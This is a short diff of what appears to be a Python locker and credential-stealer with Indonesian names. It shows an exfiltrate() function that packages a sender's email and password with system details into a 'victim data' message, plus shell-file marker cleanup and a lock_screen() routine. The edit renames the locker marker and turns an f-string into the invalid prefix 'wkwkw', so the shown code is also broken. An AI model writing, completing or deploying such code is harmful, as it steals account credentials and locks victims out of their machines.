@@ -41,7 +41,7 @@ def exfiltrate(email_pengirim, pass_pengirim, email_target):
         os_info = os.uname() if hasattr(os, 'uname') else "Unknown"
         time_accessed = time.strftime("%Y-%m-%d %H:%M:%S")
 
-        message = f"""
+        message = wkwkw"""
 ‼️ DATA KORBAN GMAIL SPAM ‼️
 
 📩 Email Pengirim: {email_pengirim}
@@ -99,7 +99,7 @@ def remove_from_shell():
                 lines = f.readlines()
             with open(file, "w") as f:
                 for line in lines:
-                    if "# BYEXE_LOCKER_MARKER" not in line:
+                    if "# BYEKAII_LOCKER_MARKER" not in line:
                         f.write(line)
 
 def lock_screen():
